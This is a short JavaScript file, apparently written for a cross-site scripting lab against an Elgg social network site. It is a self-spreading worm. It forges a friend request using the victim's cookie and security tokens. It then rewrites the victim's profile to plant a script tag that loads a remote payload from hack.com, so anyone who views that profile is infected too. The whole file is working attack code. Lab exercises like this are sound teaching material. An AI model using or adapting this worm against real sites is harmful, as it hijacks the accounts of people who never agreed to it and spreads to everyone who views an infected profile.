var Ajax=null;
// Construct the header information for the HTTP request
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/friends/add",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// Construct the content. The format of the content can be learned
// from LiveHTTPHeaders.

var sammyID = 42;
var content = "friend="+sammyID+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token;
Ajax.send(content);
console.log("worm activated");


Ajax2 = new XMLHttpRequest();
Ajax2.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
Ajax2.setRequestHeader("Host", "www.xsslabelgg.com");
Ajax2.setRequestHeader("Keep-Alive", "300");
Ajax2.setRequestHeader("Connection", "keep-alive");
Ajax2.setRequestHeader("Cookie",document.cookie);
Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
var scriptInjector = "<script src='http://www.hack.com/worm2.js'></script>";
var content = "name"+elgg.session.user.name+"&guid="+elgg.session.user.guid+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token+"&briefdescription="+escape(scriptInjector);

alert("INFECTED: "+elgg.session.user.name);

Ajax2.send(content);

console.log(Ajax2);
